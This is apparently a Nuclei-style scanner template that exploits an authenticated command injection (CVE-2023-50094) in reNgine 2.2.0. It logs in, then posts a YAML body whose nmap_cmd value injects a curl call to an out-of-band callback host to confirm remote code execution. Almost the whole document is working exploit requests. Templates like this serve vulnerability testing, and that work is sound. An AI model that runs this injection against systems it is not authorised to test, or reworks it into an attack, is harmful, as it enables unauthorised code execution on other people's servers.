id: rengine-command-injection

info:
  name: reNgine 2.2.0 - Command Injection (Authenticated)
  author: Zierax
  severity: high
  tags: command-injection, authenticated
  description: |
    This template exploits a command injection vulnerability (CVE-2023-50094) in reNgine 2.2.0
    by injecting malicious commands into the `nmap_cmd` parameter, allowing remote code execution.
  references:
    - https://rengine.wiki/
    - https://github.com/yogeshojha/rengine
    - https://github.com/Zierax/CVE-2023-50094_POC
  cve-id: CVE-2023-50094
  date: 2024-11-05
  version: v2.2.0

requests:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{BaseURL}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Welcome"
        part: body

  - raw:
      - |
        GET /scan-engine HTTP/1.1
        Host: {{BaseURL}}
    matchers:
      - type: status
        status:
          - 200

  - raw:
      - |
        POST /scan-engine/update HTTP/1.1
        Host: {{BaseURL}}
        Content-Type: application/x-yaml

        nmap_cmd: 'curl -X POST {{interactsh-url}}'
    matchers:
      - type: word
        words:
          - "Scan started"
        part: body
